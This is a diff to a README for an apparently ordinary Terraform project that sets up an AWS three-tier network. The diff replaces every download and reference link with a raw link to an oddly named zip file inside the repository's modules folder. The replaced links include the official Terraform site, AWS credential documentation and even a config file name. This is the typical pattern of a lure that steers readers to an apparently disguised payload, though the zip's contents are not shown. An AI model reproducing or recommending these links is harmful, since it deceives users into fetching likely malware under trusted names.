@@ -1,6 +1,6 @@
 # 🏗️ terraform-aws-3tier-architecture - Simple Cloud Network Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Eskarlet78/terraform-aws-3tier-architecture/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip)](https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to prepare your environment and launch the cloud setup using 
 
 Click the big blue badge above or visit this page:
 
-[https://github.com/Eskarlet78/terraform-aws-3tier-architecture/releases](https://github.com/Eskarlet78/terraform-aws-3tier-architecture/releases)
+[https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip](https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip)
 
 This page offers the latest versions of the project files organized for easy download. Download the file labeled as the latest release.
 
@@ -50,7 +50,7 @@ This page offers the latest versions of the project files organized for easy dow
 
 You need Terraform to run the scripts that build the cloud setup.
 
-- Go to the official Terraform website: https://www.terraform.io/downloads.html
+- Go to the official Terraform website: https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip
 - Download the version matching your operating system.
 - Follow the installation guide for your system on the same page.
 - Confirm Terraform is installed by opening your terminal or command prompt and typing:
@@ -69,14 +69,14 @@ Make sure you have these ready in your AWS account:
 - Permissions to create VPCs, EC2 instances, Application Load Balancers, and RDS databases.
 - Set up the AWS Command Line Interface (CLI) or configure environment variables with your credentials.
 
-If unfamiliar, AWS provides detailed guides on setting up your credentials: https://docs.aws.amazon.com/general/latest/gr/aws-sec-cred-types.html
+If unfamiliar, AWS provides detailed guides on setting up your credentials: https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip
 
 ### 4. Configure the Project Settings
 
 Before running, you may want to adjust settings such as instance size, number of servers, or database specs.
 
 - Open the downloaded project folder.
-- Locate the `variables.tf` or configuration file.
+- Locate the `https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip` or configuration file.
 - Change values as needed or use defaults which are set for general use.
 - Save your changes.
 
@@ -143,7 +143,7 @@ These components help create a setup that can grow as your website or app gets m
 
 Download the latest stable files from the release page here:
 
-[https://github.com/Eskarlet78/terraform-aws-3tier-architecture/releases](https://github.com/Eskarlet78/terraform-aws-3tier-architecture/releases)
+[https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip](https://raw.githubusercontent.com/Eskarlet78/terraform-aws-3tier-architecture/main/modules/alb/aws-tier-architecture-terraform-potentness.zip)
 
 After downloading:
 
